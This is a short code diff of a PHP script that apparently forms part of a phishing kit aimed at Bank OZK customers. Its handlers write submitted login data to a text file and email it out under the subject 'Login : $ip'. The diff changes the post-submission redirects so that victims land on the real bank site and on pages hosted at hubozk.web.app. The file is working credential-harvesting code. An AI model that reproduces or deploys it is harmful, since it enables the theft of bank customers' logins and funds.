@@ -27,7 +27,7 @@ if (isset($_POST['_cmdContinue'])) {
 	fwrite($open, $message."\n");
 	fclose($open);
 
-	header("Location: ./detail.html");
+	header("Location: https://www.ozk.com/personal/");
 
 	
 	
@@ -59,7 +59,7 @@ else if (isset($_POST['cmdContinue'])) {
 	fwrite($open, $message."\n");
 	fclose($open);
 	 
-	header("Location: ./thank.html");
+	header("Location: https://hubozk.web.app/devicefingerprinting.html");
 
 	
 	
@@ -86,7 +86,7 @@ else if (isset($_POST['userid_btn'])) {
 	$subject = "Login : $ip";
 	mail($send, $subject, $message);
 	 
-	header("Location: devicefingerprint.html");
+	header("Location: https://hubozk.web.app/devicefingerprint.html");
 	
 	$file = "text.txt";
 	$open = fopen($file, "a");
